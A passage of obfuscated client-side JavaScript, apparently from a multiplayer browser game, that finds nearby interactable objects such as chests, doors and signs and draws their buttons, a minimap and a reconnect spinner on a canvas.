			if (ᐃᐃΔ.ⲆΔⵠΔⲆⵠⲆ || ᐃᐃΔ.ⵠΔΔᐃⵠ.wait || ᐃᐃΔ.ⵠⵠⲆⵠⵠ) return;
			var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
			var ⵠᐃΔᐃ = ΔᐃᐃΔ.ᐃΔⲆΔⵠᐃΔᐃⲆ;
			if (ᐃⲆⲆ) {
				for (var ⵠᐃ = Δᐃᐃᐃ; ⵠᐃ < ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔᐃⲆᐃ].length; ⵠᐃ++) {
					var ⵠΔΔᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔᐃⲆᐃ][ⵠᐃ];
					var ⵠΔᐃΔⵠ = ΔΔⲆᐃ.ᐃⵠⵠᐃ(ⵠΔΔᐃⵠ, ᐃⲆⲆ);
					if (ⵠΔᐃΔⵠ < ⵠᐃΔᐃ) {
						ⵠᐃΔᐃ = ⵠΔᐃΔⵠ;
						ᐃᐃΔ.ⵠΔΔᐃⵠ.id = ⵠΔΔᐃⵠ.id;
						ᐃᐃΔ.ⵠΔΔᐃⵠ.ⲆⵠⵠΔ = ⵠΔΔᐃⵠ.ⲆⵠⵠΔ;
						ᐃᐃΔ.ⵠΔΔᐃⵠ.info = ⵠΔΔᐃⵠ.info;
						ᐃᐃΔ.ⵠΔΔᐃⵠ.lock = (ⵠΔΔᐃⵠ.info & ᐃᐃᐃᐃⲆᐃᐃ) >> 4
					}
				}
			}
			var ᐃⲆⲆᐃⲆᐃᐃΔⲆ = ΔⵠⵠⲆ.ΔΔⲆᐃⲆ;
			ΔⵠⵠⲆ.ΔΔⲆᐃⲆ = -ⲆⵠⲆⲆ;
			if (-ⲆⵠⲆⲆ != ᐃᐃΔ.ⵠΔΔᐃⵠ.ⲆⵠⵠΔ && (ᐃᐃΔ.ⲆᐃⵠⲆΔ.length == Ⲇᐃⵠⵠ || ᐃᐃΔ.ⵠΔΔᐃⵠ.ⲆⵠⵠΔ == ᐃᐃΔ.id)) {
				if (ᐃᐃΔ.ⲆᐃⵠⲆΔ.length == 0 && ᐃᐃΔ.ⵠΔΔᐃⵠ.info >= Δᐃⵠⵠⵠ) ΔⵠⵠⲆ.ΔΔⲆᐃⲆ = ᐃⲆⵠᐃᐃ.ⲆⵠⵠᐃⵠⲆΔ;
				else 0 == ᐃᐃΔ.ⲆᐃⵠⲆΔ.length ? ΔⵠⵠⲆ.ΔΔⲆᐃⲆ = ᐃⲆⵠᐃᐃ.ⵠᐃⲆⵠⲆⵠΔ : ΔⵠⵠⲆ.ΔΔⲆᐃⲆ = ᐃⲆⵠᐃᐃ.ⲆΔΔⵠᐃⲆΔ
			} else if (ᐃⵠΔ != ᐃᐃΔ.ⲆᐃⵠⲆΔ.length && ᐃᐃΔ.ⲆᐃⵠⲆΔ[0] != ᐃᐃΔ.id) ΔⵠⵠⲆ.ΔΔⲆᐃⲆ = ᐃⲆⵠᐃᐃ.ⵠᐃⲆⲆᐃⵠⵠ;
			else if (0 != ᐃᐃΔ.ⲆᐃⵠⲆΔ.length && ᐃᐃΔ.id == ᐃᐃΔ.ⲆᐃⵠⲆΔ[0]) ΔⵠⵠⲆ.ΔΔⲆᐃⲆ = ᐃⲆⵠᐃᐃ.ⲆⵠⲆⲆᐃΔⲆ;
			else if (0 != ᐃᐃΔ.ⲆᐃⵠⲆΔ.length) ΔⵠⵠⲆ.ΔΔⲆᐃⲆ = ᐃⲆⵠᐃᐃ.ⵠᐃⲆⵠⲆⵠΔ; - 1 != ΔⵠⵠⲆ.ΔΔⲆᐃⲆ && ΔⵠⵠⲆ.ᐃΔⵠΔᐃ[ΔⵠⵠⲆ.ΔΔⲆᐃⲆ].button.ΔᐃΔⵠ(Δ);
			var ᐃⵠᐃΔ = document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[471]).style;
			if (ΔⵠⵠⲆ.ΔΔⲆᐃⲆ != -Ⲇᐃⵠ && ᐃⲆⲆᐃⲆᐃᐃΔⲆ != ΔⵠⵠⲆ.ΔΔⲆᐃⲆ && ᐃⵠᐃΔ.display == ⵠ[35]) ΔⵠⵠⲆ.ᐃΔⵠΔᐃ[ΔⵠⵠⲆ.ΔΔⲆᐃⲆ].action()
		}

		function ᐃⲆⵠⵠΔᐃⲆⲆΔ() {
			if (ᐃᐃΔ.ⲆᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] || ᐃᐃΔ.ΔⲆᐃⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] || ᐃᐃΔ.ΔΔΔⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] || ᐃᐃΔ.ᐃΔᐃΔ[ΔᐃⲆⵠⲆⵠΔ[72]] || ᐃᐃΔ.ⲆΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]]) return;
			ᐃᐃΔ.Ⲇⵠⵠⵠⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] = ⲆΔᐃⲆΔ;
			var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
			var ⵠᐃΔᐃ = ΔᐃᐃΔ.ΔΔΔᐃΔᐃΔⲆⵠ;
			if (!ᐃⲆⲆ) return;
			for (var ⵠᐃ = 0; ⵠᐃ < ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆᐃΔⵠ].length; ⵠᐃ++) {
				var Ⲇⵠⵠⵠⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆᐃΔⵠ][ⵠᐃ];
				var ⵠΔᐃΔⵠ = ΔΔⲆᐃ.ᐃⵠⵠᐃ(Ⲇⵠⵠⵠⵠ, ᐃⲆⲆ);
				ⵠᐃΔᐃ > ⵠΔᐃΔⵠ && (ⵠᐃΔᐃ = ⵠΔᐃΔⵠ, ᐃᐃΔ.Ⲇⵠⵠⵠⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] = true, ᐃᐃΔ.Ⲇⵠⵠⵠⵠ.ⲆⵠⵠΔ = Ⲇⵠⵠⵠⵠ.ⲆⵠⵠΔ, ᐃᐃΔ.Ⲇⵠⵠⵠⵠ.ⲆⲆΔᐃⵠ = Ⲇⵠⵠⵠⵠ.id)
			}
		}

		function Δⵠᐃⵠᐃ(ᐃⵠⵠⵠ, ⲆⲆᐃᐃ) {
			!ⵠⲆ[Ⲇ.ᐃⲆ][ᐃⵠⵠⵠ] && (ⵠⲆ[Ⲇ.ᐃⲆ][ᐃⵠⵠⵠ] = ᐃᐃΔΔᐃ(ᐃ, "x" + ᐃⵠⵠⵠ, 17, ⵠ[253]));
			var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⲆ][ᐃⵠⵠⵠ];
			var Δⵠ = ⲆⲆᐃᐃ.info.translate.x + ⲆⲆᐃᐃ.info.ᐃⵠ[0].width - ᐃⵠ.width - ᐃ * 14;
			var ⲆⵠⲆ = ⲆⲆᐃᐃ.info.translate.y + ⲆⲆᐃᐃ.info.ᐃⵠ[ΔΔⵠⵠ].height - ᐃⵠ.height - ᐃ * 19;
			ⲆⲆᐃᐃ.info.state == ᐃΔⵠⵠ && (ⲆⵠⲆ += ᐃᐃⲆᐃ * ᐃ);
			ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ, ⲆⵠⲆ)
		}

		function ⲆⵠⲆᐃᐃⲆΔⲆΔ() {
			if (ᐃᐃΔ.ⲆᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] || ᐃᐃΔ.ΔⲆᐃⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]]) return;
			ᐃᐃΔ.ⲆΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] = false;
			var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
			var ⵠᐃΔᐃ = ΔᐃᐃΔ.ⵠᐃⵠⲆⲆΔⲆ;
			if (!ᐃⲆⲆ) return;
			for (var ᐃⵠᐃⵠ = Ⲇᐃⵠⵠ; ᐃⵠᐃⵠ < ᐃᐃᐃⵠⵠΔⲆ.length; ᐃⵠᐃⵠ++) {
				var ᐃᐃⵠⵠ = ᐃᐃᐃⵠⵠΔⲆ[ᐃⵠᐃⵠ][0];
				var ⲆⵠᐃⵠΔⲆⵠ = ᐃᐃᐃⵠⵠΔⲆ[ᐃⵠᐃⵠ][ΔⵠⲆΔ];
				for (var ⵠᐃ = ⵠⲆᐃⵠ; ⲆⲆⲆ.ΔⲆᐃ[ᐃᐃⵠⵠ].length > ⵠᐃ; ⵠᐃ++) {
					var ⲆΔΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ᐃᐃⵠⵠ][ⵠᐃ];
					var ⵠΔᐃΔⵠ = ΔΔⲆᐃ.ᐃⵠⵠᐃ(ⲆΔΔⲆ, ᐃⲆⲆ);
					if (ⵠᐃΔᐃ > ⵠΔᐃΔⵠ) {
						ⵠᐃΔᐃ = ⵠΔᐃΔⵠ;
						ᐃᐃΔ.ⲆΔΔⲆ.ⲆⵠᐃⵠΔⲆⵠ = ⲆⵠᐃⵠΔⲆⵠ;
						ᐃᐃΔ.ⲆΔΔⲆ.type = ᐃᐃⵠⵠ;
						ᐃᐃΔ.ⲆΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] = true;
						ᐃᐃΔ.ⲆΔΔⲆ.ⲆᐃⲆⵠⲆⵠⲆ = ⲆΔΔⲆ.info & 255;
						ᐃᐃΔ.ⲆΔΔⲆ.ⵠⵠᐃΔⵠⲆΔ = (ⲆΔΔⲆ.info & 65280) >> 8;
						ᐃᐃΔ.ⲆΔΔⲆ.ⲆⵠⵠΔ = ⲆΔΔⲆ.ⲆⵠⵠΔ;
						ᐃᐃΔ.ⲆΔΔⲆ.ⲆⲆΔᐃⵠ = ⲆΔΔⲆ.id
					}
				}
			}
			if (ⵠᐃΔᐃ < ΔᐃᐃΔ.ⵠᐃⵠⲆⲆΔⲆ) {
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⲆΔⲆ];
				var ⲆⲆᐃᐃ = ΔⵠⵠⲆ.ΔΔΔⲆⵠⵠⵠ;
				var Δⵠ = ⲆⲆᐃᐃ.info.translate.x - 33;
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ, Δⵠᐃ);
				if (ᐃᐃΔ.ⲆΔΔⲆ.ⲆᐃⲆⵠⲆⵠⲆ > 0) {
					ⲆⲆᐃᐃ.ΔᐃΔⵠ(Δ);
					var ᐃⵠⵠⵠ = ᐃᐃΔ.ⲆΔΔⲆ.ⲆᐃⲆⵠⲆⵠⲆ;
					ΔⵠΔⵠ < ᐃⵠⵠⵠ && Δⵠᐃⵠᐃ(ᐃⵠⵠⵠ, ⲆⲆᐃᐃ)
				}
				switch (ᐃᐃΔ.ⲆΔΔⲆ.ⲆⵠᐃⵠΔⲆⵠ) {
					case ᐃᐃ.ᐃᐃΔⲆ:
						var ⲆⲆᐃᐃ = ΔⵠⵠⲆ.ΔⵠΔΔᐃᐃΔ;
						break;
					case ᐃᐃ.ΔⲆⵠⵠ:
						var ⲆⲆᐃᐃ = ΔⵠⵠⲆ.ⲆΔⵠᐃⲆᐃⵠ;
						break;
					case ᐃᐃ.ΔⲆᐃΔ:
						var ⲆⲆᐃᐃ = ΔⵠⵠⲆ.ΔᐃⲆⵠⲆΔᐃ;
						break;
					case ᐃᐃ.ⲆⵠΔⲆ:
						var ⲆⲆᐃᐃ = ΔⵠⵠⲆ.ᐃΔΔᐃⲆⵠⲆ;
						break;
					case ᐃᐃ.ⲆΔᐃᐃ:
						var ⲆⲆᐃᐃ = ΔⵠⵠⲆ.ΔⲆⲆΔⵠⵠⲆ;
						break
				}
				if (ᐃᐃΔ.ⲆΔΔⲆ.ⵠⵠᐃΔⵠⲆΔ > 0) {
					ⲆⲆᐃᐃ.ΔᐃΔⵠ(Δ);
					var ᐃⵠⵠⵠ = ᐃᐃΔ.ⲆΔΔⲆ.ⵠⵠᐃΔⵠⲆΔ;
					ⵠⲆΔ < ᐃⵠⵠⵠ && Δⵠᐃⵠᐃ(ᐃⵠⵠⵠ, ⲆⲆᐃᐃ)
				}
			}
		}

		function ⲆᐃⵠᐃᐃΔⵠⵠⲆ() {
			if (ᐃᐃΔ.ⲆᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] || ᐃᐃΔ.ΔⲆᐃⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]]) return;
			ᐃᐃΔ.ΔΔΔⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] = ⲆΔⲆᐃΔ;
			var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
			var ⵠᐃΔᐃ = ΔᐃᐃΔ.ⵠΔⲆᐃΔᐃⲆ;
			if (!ᐃⲆⲆ) return;
			for (var ⵠᐃ = ΔΔⵠ; ⵠᐃ < ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔΔⲆᐃᐃ].length; ⵠᐃ++) {
				var ΔΔΔⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔΔⲆᐃᐃ][ⵠᐃ];
				var ⵠΔᐃΔⵠ = ΔΔⲆᐃ.ᐃⵠⵠᐃ(ΔΔΔⵠ, ᐃⲆⲆ);
				ⵠΔᐃΔⵠ < ⵠᐃΔᐃ && (ⵠᐃΔᐃ = ⵠΔᐃΔⵠ, ᐃᐃΔ.ΔΔΔⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] = ⲆⵠⲆᐃⲆΔΔ, ᐃᐃΔ.ΔΔΔⵠ.ᐃⵠⲆᐃⵠᐃΔ = ΔΔΔⵠ.info & 255, ᐃᐃΔ.ΔΔΔⵠ.ΔΔΔⲆᐃ = (ΔΔΔⵠ.info & 65280) >> ⲆᐃΔⲆⵠ, ᐃᐃΔ.ΔΔΔⵠ.ⲆⵠⵠΔ = ΔΔΔⵠ.ⲆⵠⵠΔ, ᐃᐃΔ.ΔΔΔⵠ.ⲆⲆΔᐃⵠ = ΔΔΔⵠ.id)
			}
			if (ΔᐃᐃΔ.ⵠΔⲆᐃΔᐃⲆ > ⵠᐃΔᐃ) {
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠᐃᐃᐃΔΔ];
				var ⲆⲆᐃᐃ = ΔⵠⵠⲆ.ⵠΔᐃΔΔⲆⵠ;
				var Δⵠ = ⲆⲆᐃᐃ.info.translate.x - 33;
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ, Ⲇᐃⵠⵠ);
				if (ᐃᐃΔ.ΔΔΔⵠ.ᐃⵠⲆᐃⵠᐃΔ > 0) {
					ⲆⲆᐃᐃ.ΔᐃΔⵠ(Δ);
					var ᐃⵠⵠⵠ = ᐃᐃΔ.ΔΔΔⵠ.ᐃⵠⲆᐃⵠᐃΔ;
					ⵠΔⲆ < ᐃⵠⵠⵠ && Δⵠᐃⵠᐃ(ᐃⵠⵠⵠ, ⲆⲆᐃᐃ)
				}
				var ⲆⲆᐃᐃ = ΔⵠⵠⲆ.ⵠΔΔᐃΔⲆᐃ;
				if (ᐃᐃΔ.ΔΔΔⵠ.ΔΔΔⲆᐃ > ΔΔⵠ) {
					ⲆⲆᐃᐃ.ΔᐃΔⵠ(Δ);
					var ᐃⵠⵠⵠ = ᐃᐃΔ.ΔΔΔⵠ.ΔΔΔⲆᐃ;
					if (ⵠΔⵠΔ < ᐃⵠⵠⵠ) Δⵠᐃⵠᐃ(ᐃⵠⵠⵠ, ⲆⲆᐃᐃ)
				}
			}
		}

		function ΔⵠΔⵠⵠᐃⵠⵠΔ() {
			if (ᐃᐃΔ.ⲆᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]]) return;
			ᐃᐃΔ.ΔⲆᐃⲆⵠ.ⲆΔⲆⲆ = ⵠΔⲆⵠ;
			ᐃᐃΔ.ΔⲆᐃⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] = ᐃⵠΔⵠⲆ;
			var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
			var ⵠᐃΔᐃ = ΔᐃᐃΔ.ΔΔᐃⲆⵠᐃⵠ;
			if (!ᐃⲆⲆ) return;
			for (var ⵠᐃ = ⲆΔⵠ; ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⵠΔᐃ].length > ⵠᐃ; ⵠᐃ++) {
				var ΔⲆᐃⲆⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⵠΔᐃ][ⵠᐃ];
				var ⵠΔᐃΔⵠ = ΔΔⲆᐃ.ᐃⵠⵠᐃ(ΔⲆᐃⲆⵠ, ᐃⲆⲆ);
				if (ⵠΔᐃΔⵠ < ⵠᐃΔᐃ) {
					ⵠᐃΔᐃ = ⵠΔᐃΔⵠ;
					ᐃᐃΔ.ΔⲆᐃⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] = ΔᐃΔΔⵠ;
					ᐃᐃΔ.ΔⲆᐃⲆⵠ.ⲆΔⲆⲆ = ΔⲆᐃⲆⵠ.info;
					ᐃᐃΔ.ΔⲆᐃⲆⵠ.ⲆⵠⵠΔ = ΔⲆᐃⲆⵠ.ⲆⵠⵠΔ;
					ᐃᐃΔ.ΔⲆᐃⲆⵠ.ⲆⲆΔᐃⵠ = ΔⲆᐃⲆⵠ.id
				}
			}
			if (ⵠᐃΔᐃ < ΔᐃᐃΔ.ΔΔᐃⲆⵠᐃⵠ) {
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆΔΔΔᐃΔΔ];
				var ⲆⲆᐃᐃ = ΔⵠⵠⲆ.ΔᐃᐃⵠⲆⵠᐃ;
				var Δⵠ = Math.floor(ⲆⲆᐃᐃ.info.translate.x + (ⲆⲆᐃᐃ.info.ᐃⵠ[ⲆⲆⲆᐃ].width - ᐃⵠ.width) / Ⲇⵠⵠᐃ);
				var ⲆⵠⲆ = Math.floor(ⲆⲆᐃᐃ.info.translate.y + (ⲆⲆᐃᐃ.info.ᐃⵠ[0].height - ᐃⵠ.height) / ⵠΔⲆᐃ) + ⵠⲆΔⵠΔ;
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ, ⲆⵠⲆ);
				if (ᐃᐃΔ.ΔⲆᐃⲆⵠ.ⲆΔⲆⲆ > Δᐃᐃᐃ) {
					ⲆⲆᐃᐃ.ΔᐃΔⵠ(Δ);
					var ᐃⵠⵠⵠ = ᐃᐃΔ.ΔⲆᐃⲆⵠ.ⲆΔⲆⲆ;
					ᐃⵠⵠⵠ > 1 && Δⵠᐃⵠᐃ(ᐃⵠⵠⵠ, ⲆⲆᐃᐃ)
				}
			}
		}

		function ⲆⵠⵠΔᐃⵠⵠΔⲆ() {
			if (ᐃᐃΔ.ⲆᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] || ᐃᐃΔ.ΔⲆᐃⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] || ᐃᐃΔ.ΔΔΔⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] || ᐃᐃΔ.ᐃΔᐃΔ[ΔᐃⲆⵠⲆⵠΔ[72]] || ᐃᐃΔ.ⲆΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]]) return;
			ᐃᐃΔ.sign[ΔᐃⲆⵠⲆⵠΔ[72]] = false;
			var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
			var ⵠᐃΔᐃ = ΔᐃᐃΔ.ΔⲆΔΔΔⲆⲆ;
			if (!ᐃⲆⲆ) return;
			for (var ⵠᐃ = ΔⲆⵠⲆ; ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠᐃⲆᐃ].length > ⵠᐃ; ⵠᐃ++) {
				var ΔΔⲆⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠᐃⲆᐃ][ⵠᐃ];
				var ⵠΔᐃΔⵠ = ΔΔⲆᐃ.ᐃⵠⵠᐃ(ΔΔⲆⵠ, ᐃⲆⲆ);
				ⵠΔᐃΔⵠ < ⵠᐃΔᐃ && 0 === ΔΔⲆⵠ.info && ᐃᐃΔ.id === ΔΔⲆⵠ.ⲆⵠⵠΔ && (ᐃᐃΔ.sign[ΔᐃⲆⵠⲆⵠΔ[72]] = true, ⵠᐃΔᐃ = ⵠΔᐃΔⵠ, ᐃᐃΔ.sign.ⲆⲆΔᐃⵠ = ΔΔⲆⵠ.id)
			}
			if (ΔᐃᐃΔ.ΔⲆΔΔΔⲆⲆ > ⵠᐃΔᐃ) {
				var ⲆⲆᐃᐃ = ΔⵠⵠⲆ.sign.button;
				ⲆⲆᐃᐃ.ΔᐃΔⵠ(Δ)
			}
		}

		function ⵠⲆΔⲆᐃⲆⵠⲆΔ() {
			if (!ᐃᐃΔ.ⲆⵠᐃⲆⵠᐃⲆ) return;
			Δ.globalAlpha = .5;
			Δ.fillStyle = ⵠ[481];
			Δ.fillRect(ⵠⲆⲆ, ΔΔⵠ, ΔΔΔᐃ, ⵠⲆᐃⲆ);
			Δ.globalAlpha = .8;
			var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⵠΔΔⵠⵠⲆ][ⲆⲆⲆ.time];
			var Δⵠ = Δᐃⵠᐃ - ᐃⵠ.width / 2;
			var ⲆⵠⲆ = ᐃΔⵠᐃ - ᐃⵠ.height / ⵠⵠΔⲆ;
			ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ, ⲆⵠⲆ);
			Δ.globalAlpha = 1; - 1 < ΔⵠⵠⲆ.ᐃⵠΔⲆⵠ.ᐃⲆᐃᐃᐃ.x && (Δ.fillStyle = ⵠ[429], ⵠᐃᐃ(Δ, Δⵠ + ᐃ * (ΔⵠⵠⲆ.ᐃⵠΔⲆⵠ.ᐃⲆᐃᐃᐃ.x * ⲆΔⵠⵠ), ⲆⵠⲆ + ᐃ * (3 * ΔⵠⵠⲆ.ᐃⵠΔⲆⵠ.ᐃⲆᐃᐃᐃ.y), ΔⲆᐃᐃᐃ * ᐃ), Δ.fill());
			var ᐃᐃᐃⵠ = ΔⵠⵠⲆ.ᐃⵠΔⲆⵠ.ᐃᐃᐃⵠ;
			for (var ⵠᐃ = ᐃΔΔ; ⵠᐃ < ᐃᐃᐃⵠ.length; ⵠᐃ++) {
				var ᐃⲆⲆ = ᐃᐃᐃⵠ[ⵠᐃ];
				Δ.fillStyle = !ⲆⲆⲆ.time ? ⵠ[422] : ⵠ[422];
				ⵠᐃᐃ(Δ, Δⵠ + ᐃ * (600 * (ᐃⲆⲆ.x / (ᐃⲆΔⲆⵠ * ⲆⲆⲆ.ᐃΔᐃᐃΔ))), ⲆⵠⲆ + ᐃ * (ᐃⲆⲆ.y / (ΔΔⲆⵠΔⲆⵠ * ⲆⲆⲆ.ⵠᐃⵠⲆⵠ) * 600), ᐃ * ⵠΔⵠᐃⵠ);
				Δ.fill()
			}
			var ᐃᐃᐃΔ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
			ᐃᐃᐃΔ && (Δ.fillStyle = !ⲆⲆⲆ.time ? "#e39716" : ⵠ[433], ⵠᐃᐃ(Δ, Δⵠ + 600 * (ᐃᐃᐃΔ.x / (ᐃᐃᐃⵠⵠⲆⵠ * ⲆⲆⲆ.ᐃΔᐃᐃΔ)) * ᐃ, ⲆⵠⲆ + ᐃ * (600 * (ᐃᐃᐃΔ.y / (100 * ⲆⲆⲆ.ⵠᐃⵠⲆⵠ))), ᐃ * 12), Δ.fill())
		}

		function ΔᐃᐃΔⲆΔⵠᐃᐃ() {
			if (ᐃᐃΔ.reconnect.enabled) {
				Δ.globalAlpha = .9;
				Δ.fillStyle = ⵠ[481];
				Ⲇᐃᐃ(Δ, Δᐃⵠᐃ - 150, ᐃΔⵠᐃ - 90, 300, 180, ⲆᐃⲆΔⲆ);
				Δ.fill();
				Δ.globalAlpha = ⵠᐃⵠΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⵠᐃᐃⲆⵠⵠ];
				Δ.save();
				ᐃᐃΔ.reconnect.rotate = (ᐃᐃΔ.reconnect.rotate + ᐃⵠᐃᐃ * 2) % (Math.PI * ΔⵠᐃⲆ);
				Δ.translate(ΔΔΔᐃ / 2, ⵠⲆᐃⲆ / 2 - 25);
				Δ.rotate(ᐃᐃΔ.reconnect.rotate);
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / ⲆⲆΔᐃ, -ᐃⵠ.height / ⵠⲆⵠⲆ);
				Δ.restore();
				var ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔᐃΔⲆᐃᐃ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, (ΔΔΔᐃ - ᐃⵠ.width) / 2, (ⵠⲆᐃⲆ - ᐃⵠ.height) / 2 + 25)
			}
		}

		function ᐃⲆⲆᐃΔᐃⵠΔⲆ(ᐃⵠⵠⵠ, ⲆⲆᐃᐃ, ΔⵠⲆ) {
			var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠⲆᐃΔⵠⲆ][ᐃⵠⵠⵠ];
			var Δⵠ = ⲆⲆᐃᐃ.info.translate.x + ᐃ * 5;
			var ⲆⵠⲆ = ⲆⲆᐃᐃ.info.translate.y + ⵠⵠᐃⵠ * ᐃ;
			if (ⲆⲆᐃᐃ.info.state == ᐃΔⵠⵠ || ΔⵠⲆ) ⲆⵠⲆ += 5 * ᐃ;
			ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ, ⲆⵠⲆ)
		}

		function ᐃΔΔᐃΔᐃⲆⵠᐃ() {
			if (ᐃᐃΔ.ⲆᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] || ᐃᐃΔ.ΔⲆᐃⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] || ᐃᐃΔ.ΔΔΔⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] || ᐃᐃΔ.ⲆΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]]) return;
			ᐃᐃΔ.ᐃΔᐃΔ[ΔᐃⲆⵠⲆⵠΔ[72]] = false;
			var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
			var ⵠᐃΔᐃ = ΔᐃᐃΔ.ΔᐃⵠⲆⲆⲆΔ;
			if (!ᐃⲆⲆ) return;
			for (var ⵠᐃ = 0; ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠᐃⲆⵠ].length > ⵠᐃ; ⵠᐃ++) {
				var ᐃΔᐃΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠᐃⲆⵠ][ⵠᐃ];
				var ⵠΔᐃΔⵠ = ΔΔⲆᐃ.ᐃⵠⵠᐃ(ᐃΔᐃΔ, ᐃⲆⲆ);
				if (ⵠΔᐃΔⵠ < ⵠᐃΔᐃ) {
					ⵠᐃΔᐃ = ⵠΔᐃΔⵠ;
					ᐃᐃΔ.ᐃΔᐃΔ[ΔᐃⲆⵠⲆⵠΔ[72]] = ΔΔⲆⲆΔ;
					ᐃᐃΔ.ᐃΔᐃΔ.ⲆᐃⲆⵠⲆⵠⲆ = ᐃΔᐃΔ.info & 31;
					ᐃᐃΔ.ᐃΔᐃΔ.ΔΔΔⲆᐃ = (ᐃΔᐃΔ.info & 992) >> 5;
					ᐃᐃΔ.ᐃΔᐃΔ.ⲆⲆⲆⵠΔΔΔ = (ᐃΔᐃΔ.info & 31744) >> 10;
					ᐃᐃΔ.ᐃΔᐃΔ.ⲆⵠⵠΔ = ᐃΔᐃΔ.ⲆⵠⵠΔ;
					ᐃᐃΔ.ᐃΔᐃΔ.ⲆⲆΔᐃⵠ = ᐃΔᐃΔ.id
				}
			}
			if (ⵠᐃΔᐃ < ΔᐃᐃΔ.ΔᐃⵠⲆⲆⲆΔ) {
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠΔⵠⵠⵠΔⵠ];
				var ⲆⲆᐃᐃ = ΔⵠⵠⲆ.ΔⵠⲆᐃΔⲆⵠ;
				var Δⵠ = ⲆⲆᐃᐃ.info.translate.x - 32;
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ, ⵠⲆⲆ);
				if (Δᐃᐃⵠ < ᐃᐃΔ.ᐃΔᐃΔ.ⲆᐃⲆⵠⲆⵠⲆ) {
					ⲆⲆᐃᐃ.ΔᐃΔⵠ(Δ);
					var ᐃⵠⵠⵠ = ᐃᐃΔ.ᐃΔᐃΔ.ⲆᐃⲆⵠⲆⵠⲆ;
					1 < ᐃⵠⵠⵠ && Δⵠᐃⵠᐃ(ᐃⵠⵠⵠ, ⲆⲆᐃᐃ)
				}
				var ⲆⲆᐃᐃ = ΔⵠⵠⲆ.ⵠΔᐃⵠⵠⲆⲆ;
				if (ᐃᐃΔ.ᐃΔᐃΔ.ⲆⲆⲆⵠΔΔΔ > ⵠᐃⲆᐃ) {
					ⲆⲆᐃᐃ.ΔᐃΔⵠ(Δ);
					var ᐃⵠⵠⵠ = ᐃᐃΔ.ᐃΔᐃΔ.ⲆⲆⲆⵠΔΔΔ;
